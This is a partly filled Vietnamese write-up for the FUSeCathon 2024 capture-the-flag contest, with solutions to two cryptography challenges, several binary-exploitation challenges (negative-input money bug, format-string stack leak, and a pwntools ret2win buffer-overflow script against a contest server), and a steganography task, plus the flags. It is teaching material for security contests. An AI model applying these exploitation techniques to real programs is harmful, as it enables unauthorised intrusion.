---
title: "Write up FUSeCathon 2024"
---

# Introduction

This is the write-up for the FUSeCathon 2024.

# Reverse Engineering
---
## RE1

<write here>

---
## RE2

<write here>

---

## RE3

<write here>

---

## MiniSteg

<write here>

---

## Horrible childhood memories

<write here>

---

## Nothing there

<write here>

---

## mov

<write here>

---

# Cryptography

---

## CRYPTO

### Flag format: 
`FUSec{...}`

### Đề bài
Hãy phân tích chương trình mã hóa sau để giải mã chuỗi sau: ['159.96.34.204', '136.182.188.58', '155.20.31.30', '12.234.113.15', '153.170.118.69', '189.152.240.17', '180.27.111.161', '87.205.101.118', '45.1.136.2', '122.3.3.3']

```
import socket
import struct

def cipher(k, d):
    S = list(range(256))
    j = 0
    o = []
    for i in range(256):
        j = (j + S[i] + k[i % len(k)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    for c in d:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        o.append(c ^ S[(S[i] + S[j]) % 256])
    return bytearray(o)

def encr(pt, k):
    ed = cipher(k, pt.encode('utf-8'))
    padding_length = (4 - len(ed) % 4) % 4
    ed += bytes([padding_length] * padding_length)
    ipa = d2ip(ed)
    return ipa

def d2ip(d):
    ipa = []
    for i in range(0, len(d), 4):
        pd = d[i:i+4]
        if len(pd) < 4:
            pd += b'\x00' * (4 - len(pd))
        ip = socket.inet_ntoa(struct.pack('!I', int.from_bytes(pd, byteorder='big')))
        ipa.append(ip)
    return ipa

def main():
    key = bytearray('supersecretkey', 'utf-8')
    plaintext = "hiyou"
    ipa = encr(plaintext, key)
    print("IPv4 Encoded Data:", ipa)

if __name__ == "__main__":
    main()
```

### Phân tích
Ở đây, ta sẽ để ý hàm để mã hóa:
```
def encr(pt, k):
    ed = cipher(k, pt.encode('utf-8'))
    padding_length = (4 - len(ed) % 4) % 4
    ed += bytes([padding_length] * padding_length)
    ipa = d2ip(ed)
    return ipa
```
Hàm `encr` sẽ gọi hàm `cipher` để mã hóa `pt`. Kết quả sau đó sẽ được thêm padding sao cho độ dài của `ed` là bội số của 4. Kết quả sau đó sẽ được truyền vào hàm `d2ip`:
```
def d2ip(d):
    ipa = []
    for i in range(0, len(d), 4):
        pd = d[i:i+4]
        if len(pd) < 4:
            pd += b'\x00' * (4 - len(pd))
        ip = socket.inet_ntoa(struct.pack('!I', int.from_bytes(pd, byteorder='big')))
        ipa.append(ip)
    return ipa
```
Hàm này sẽ chia ciphertext của chúng ta thành từng block 4 bytes, nếu không đủ 4 bytes sẽ thêm bytes \x00. Sau đó, mỗi block này sẽ được chuyển thành một địa chỉ IP sử dụng `socket.inet_ntoa(struct.pack('!I', int.from_bytes(pd, byteorder='big')))`. Kết quả sẽ trả về 1 list các IP. Hàm này có thể dễ dàng được reverse:
```
def ip2d(ipa):
    d = bytearray()
    for ip in ipa:
        d += struct.unpack('!I', socket.inet_aton(ip))[0].to_bytes(4, byteorder='big')
    return d
```
Giờ ta phải tìm cách để decrypt. Để làm được, ta phải nhìn vào hàm `cipher`:
```
def cipher(k, d):
    S = list(range(256))
    j = 0
    o = []
    for i in range(256):
        j = (j + S[i] + k[i % len(k)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    for c in d:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        o.append(c ^ S[(S[i] + S[j]) % 256])
    return bytearray(o)
```
Hàm này sẽ nhận vào một key là `k` và plaintext là `d`. Có khá nhiều các phép tính có thể gây rối, tuy nhiên, thật ra chúng ta chỉ cần quan tâm vào chỗ liên quan tới plaintext:
```
o.append(c ^ S[(S[i] + S[j]) % 256])
```
### Lời giải
```
import socket
import struct

def uncipher(k, d):
    S = list(range(256))
    j = 0
    o = []
    for i in range(256):
        j = (j + S[i] + k[i % len(k)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    for c in d:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        o.append(c ^ S[(S[i] + S[j]) % 256])
    return bytes(o)

def decr(ct, k):
    ed = ip2d(ct)
    padding_length = ed[-1]
    ed = ed[:-padding_length]
    pt = uncipher(k, ed)
    return pt
    
def ip2d(ipa):
    d = b''
    for ip in ipa:
        d += struct.unpack('!I', socket.inet_aton(ip))[0].to_bytes(4, byteorder='big')
    return d

ipa = ['159.96.34.204', '136.182.188.58', '155.20.31.30', '12.234.113.15', '153.170.118.69', '189.152.240.17', '180.27.111.161', '87.205.101.118', '45.1.136.2', '122.3.3.3']
key = b'supersecretkey'

flag = decr(ipa, key)
print("Flag:", flag.decode())
```
### Flag
`FUSec{howdyiamnowinyourhanddecrypted}`

---

## Passio

### Đề bài:
Bobby asked me for help with a RSA problem without n, I looked at it then told him "Are you sure?"

Flag format: `FUSec{...}`
### Tệp đính kèm
*passio.py*
```
from Crypto.Util.number import bytes_to_long, getPrime

flag = [REDACTED]
m = bytes_to_long(flag)

def encrypt(m):
    e = 65537
    p = getPrime(1024)
    q = getPrime(1024)
    n = p*q
    c = pow(m,e,n)
    a = (p-q)**2
    b = (- a + p**2 + (n/p)**2 )//2
    return e,c,a,b

e,c,a,b = encrypt(m)
print(f"e = {e}")
print(f"c = {c}")
print(f"a = {a}")
print(f"b = {b}")
```
*output.txt*
```
e = 65537
c = 4894338948230470402928707660063586665636133877586628109286241259878275641109260494250817384130584823023329214861979751690561963081617330374455480937234003034778422057395258010775097230080392424358571869844921255624947595968885461336534123911023572529241708327941415913437014197548383286789776095955388635342283203973058210421769275756231192136995375798956898692310541958709215238144712661194018824033701744341479923354157538062092566495209486033904676472485258630642100327543009349262295112047920247519664433630167562500666323341592847174220829798027284008552903119224441839814665400078900184486541916998240568904705
a = 393456223857499815661440893717237240259558532366307287354939441196311328949860421416124009442050320948087336435143720894089753027228194240947622428203376810145932210705733770034443667398090161183195152510628824806145343323163571130613629037517397113076778861973589406580949978852396850740937967511740793366718048124032828534650408728081568348328248119414349235373240606071821213323875846349460120944891074555047511689135169428789631873739254733345142491718992571738713056167486886120514825916775402671062923588643868842453016804611449814240016650065033987944589204140386114206477925791659758110022008860563780659396
b = 11997006831727597838859364379547062689932572744654083166666125612150864313407998295085610421366633182857541448885000307627927684124124072436714719725683483054325256112952201064675498215555364445264410432688875142865327809337551169797877858548294909424784553164763477253336970584908792648056372024900456778666784310573833378011487122136965254930590589667169199039644211411717263218811900115539686093700331167756218836245807831177200156278406549658828318058079509048851064280486981767162435384614595648983175096386101363481286000348432698288589000697700575297289732367910581200141589916469083271346255824183497275727827
```
### Phân tích
Đây là một bài mã hóa RSA 1024 bit, thế nhưng đề bài không cho ta biết n mà thay vào đó là hai số `a` và `b` được biến đổi từ `p` và `q`. Sau khi đọc *passio.py*, ta có:

$$a = (p - q)^{2}$$

$$b = \dfrac{-a + p^{2} + (\dfrac{n}{p})^{2}}{2}$$

Ta sẽ biến đổi b:

Do $n = p * q$, có:

$$2b = -a + p^{2} + q^{2}$$

Thay a vào b:

$$2b = -(p-q)^{2} + p^{2} + q^{2}$$

$$2b = -(p^{2} - 2pq + q^{2}) + p^{2} + q^{2}$$

$$2b = 2pq$$

Đến đây bài toán quay về [tìm hai số khi biết tích và hiệu của lớp 4](https://th-xuyenmoc-bariavungtau.violet.vn/entry/cach-giai-bai-toan-tim-hai-so-khi-biet-hieu-va-tich-8645158.html):

$$p - q = \sqrt{a}$$

$$x \times y = b$$

### Lời giải

Sau khi tìm ra cách giải, viết code python để giải là xong:

```
from Crypto.Util.number import *
from decimal import *


e = 65537
c = 4894338948230470402928707660063586665636133877586628109286241259878275641109260494250817384130584823023329214861979751690561963081617330374455480937234003034778422057395258010775097230080392424358571869844921255624947595968885461336534123911023572529241708327941415913437014197548383286789776095955388635342283203973058210421769275756231192136995375798956898692310541958709215238144712661194018824033701744341479923354157538062092566495209486033904676472485258630642100327543009349262295112047920247519664433630167562500666323341592847174220829798027284008552903119224441839814665400078900184486541916998240568904705
a = 393456223857499815661440893717237240259558532366307287354939441196311328949860421416124009442050320948087336435143720894089753027228194240947622428203376810145932210705733770034443667398090161183195152510628824806145343323163571130613629037517397113076778861973589406580949978852396850740937967511740793366718048124032828534650408728081568348328248119414349235373240606071821213323875846349460120944891074555047511689135169428789631873739254733345142491718992571738713056167486886120514825916775402671062923588643868842453016804611449814240016650065033987944589204140386114206477925791659758110022008860563780659396
b = 11997006831727597838859364379547062689932572744654083166666125612150864313407998295085610421366633182857541448885000307627927684124124072436714719725683483054325256112952201064675498215555364445264410432688875142865327809337551169797877858548294909424784553164763477253336970584908792648056372024900456778666784310573833378011487122136965254930590589667169199039644211411717263218811900115539686093700331167756218836245807831177200156278406549658828318058079509048851064280486981767162435384614595648983175096386101363481286000348432698288589000697700575297289732367910581200141589916469083271346255824183497275727827

getcontext().prec = 1024
hieu = int((Decimal(a).sqrt()))
binhPhuongTong = a + 4*b
tong = int((Decimal(binhPhuongTong).sqrt()))

p = (tong + hieu) // 2
q = (tong - hieu) // 2
n = p * q

phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
plain = pow(c,d,n)
print(long_to_bytes(plain))
```

### Flag:

`FUsec{S1mpl3_biN0m1al_sQu4r3}`

---

# Web

---

## IsH0wSp33d

<write here>

---

## web-secu-challenge

<write here>

---

## wsproblem

<write here>

---

## donottrust

<write here>

---

## Checkpoint

<write here>

---

## save-the-changes

<write here>

---

## Hells-Lab

<write here>

---

## Kotlin App

<write here>

---

## web-the-mindfullness-inside

---

# Binary Exploitation

---

## cards

![image](https://hackmd.io/_uploads/ByDR6xKXA.png) <br>
![image](https://hackmd.io/_uploads/Hyu_5S_Q0.png) <br>
![image](https://hackmd.io/_uploads/BkrK9rumR.png) <br>
![image](https://hackmd.io/_uploads/SJHvqrdXC.png) <br>
![image](https://hackmd.io/_uploads/S1ASnHOmA.png) <br>

Ở đây hàm `get_int` được sử dụng khá nhiều để lấy số input, rồi sử dụng `atoi` để chuyển input thành int. Tuy nhiên khi nhập số tiền vào thì nó chỉ check `if ( v4 * v3 > current_gold )` nghĩa là số tiền của mình có lớn hơn số tiền hiện tại không, chứ không check số tiền đầu vào có **âm** không -> `integer overflow`. <br>
![image](https://hackmd.io/_uploads/SJDUTSdX0.png)
Vậy nên ta đơn giản chỉ cần input số âm vào và chơi thua là có tiền :flushed: <br>
![image](https://hackmd.io/_uploads/HyJVCBuQC.png)

---

## pwn-challenge

![image](https://hackmd.io/_uploads/HkiZAltXR.png) <br>

Bài này là dạng blackbox, ta phải exploit mà không có source. Hint là buffer overflow nhưng lỗi ở đây lại là format string :angry: 
Ta đơn giản chỉ cần input một loạt `%lx` vào để lấy data từ stack <br>
![image](https://hackmd.io/_uploads/Syt4ybFmA.png) <br>
![image](https://hackmd.io/_uploads/rkdS1btXA.png) <br>

---

## pwnme
![image](https://hackmd.io/_uploads/SklwybtXC.png) <br>
![image](https://hackmd.io/_uploads/S1CYkWKQR.png) <br>

Nhìn qua thì nó chỉ là buffer overflow ret2win đơn giản, ta chỉ cần tìm offet của `ret` và cho địa chỉ hàm `hacked()` vào. <br>

![image](https://hackmd.io/_uploads/rk8ZgbK7C.png) <br>
```python
#!/usr/bin/python3

from pwn import *

exe = ELF('pwn_1', checksec=False)
libc = exe.libc
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('challenge.fuctf.com', 8001)
else:
    p = process(exe.path)
# GDB()

payload = b'A'*24 + p64(exe.sym.hacked + 1)
sla(b'Name:\n', payload)

p.interactive()

```
Sau khi chương trình nhày vào hàm `hacked`,lúc `push rbp` thì do stack ko chia hết cho 16 nên sẽ bị sigsegv ở `$xmm1` nên ta sẽ nhảy vào địa chỉ hàm đó + 1. <br>
![image](https://hackmd.io/_uploads/SJA4GZFQ0.png)

---

## brain@#(S

<write here>

---

# Forensics
---
## Database Attack Analyzing

<write here>

---

## Basic Steganography


![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/73a54b18-93c7-4409-9c3c-e7e8b8cd74ee)

Ở bài này, mình thấy rằng challenge liên quan đến basic steganography tức là kỹ thuật giấu tin cơ bản. Và mình được cho một file ảnh

![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/9893d9ed-e4a4-4bc6-b6c6-f35b8ad155b5)

Mình thấy rằng đây là file JPG. Sau đó mình thử dùng strings và grep thử flag.

![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/26043721-90a5-49a4-9a64-7114f1806ef7)

Bất ngờ là nó đúng như những gì mình nghĩ về 1 challenge basic.

**Flag: FUSec{70VictoryDienBienPhu}**

---

## No suspicious

<write here>

---

## Ransomware recovery

<write here>

---

# Miscillaneous

---

## FIA love regex

<write here>

---
